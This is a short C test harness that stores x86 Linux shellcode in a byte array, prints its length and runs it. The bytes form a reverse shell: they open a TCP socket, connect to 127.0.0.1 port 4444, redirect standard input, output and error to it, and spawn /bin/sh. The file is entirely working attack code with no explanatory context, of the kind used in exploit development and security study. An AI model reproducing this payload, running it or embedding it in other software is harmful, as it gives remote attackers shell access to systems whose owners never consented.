#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x31\xc0\xb0\x66\x31\xdb\xb3\x01\x31\xc9\x51\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x31\xd2\x89\xc2\x31\xc0\xb0\x66\x31\xdb\xb3\x03\x31\xff\xbf\x80\xff\xff\xfe\x83\xf7\xff\x31\xc9\x57\x66\x68\x11\x5c\x66\x6a\x02\x89\xe6\x6a\x10\x56\x52\x89\xe1\xcd\x80\x52\xb0\x3f\x5b\x31\xc9\xcd\x80\xb0\x3f\xb1\x01\xcd\x80\xb0\x3f\xb1\x02\xcd\x80\xb0\x0b\x31\xdb\x53\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc9\x31\xd2\xcd\x80";

int main()
{
	printf("Shellcode Length: %d\n", strlen(code));

        int (*ret)() = (int(*)())code;

        ret();
}
